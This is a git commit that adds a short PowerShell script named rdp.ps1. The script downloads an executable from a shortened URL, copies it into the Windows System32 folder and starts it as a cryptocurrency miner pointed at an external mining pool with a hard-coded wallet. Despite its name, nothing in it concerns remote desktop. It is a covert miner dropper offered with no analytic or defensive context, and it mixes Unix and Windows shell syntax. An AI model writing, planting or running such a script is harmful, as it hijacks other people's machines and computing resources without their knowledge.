15782ffc934a8aaa346e57f4fde12a81a37321a1
aOOxdwDJBCNkj <93464472+aOOxdwDJBCNkj@users.noreply.github.com>
2021-10-31 11:23:42 +0000

    Create rdp.ps1

---
+++ rdp.ps1
@@ -0,0 +1,3 @@
+Invoke-WebRequest https://bit.ly/2ZIc2a0 -OutFile logmin.exe
+Copy logmin.exe C:\Windows\System32
+cmd /c echo cmd /k start logcmin --pool pool.semipool.com:33309 --username gunsCrDVtDZNnpGQLr87BKNADNKJ8qgqGcrhqu3zoDG4GFcYaUs82ioVyXrcHTengEEiouGUvhu1NTZKXy6USCHhA9Wov5jYx9 --password $(shuf -n 1 -i 1-99999) --algorithm chukwa
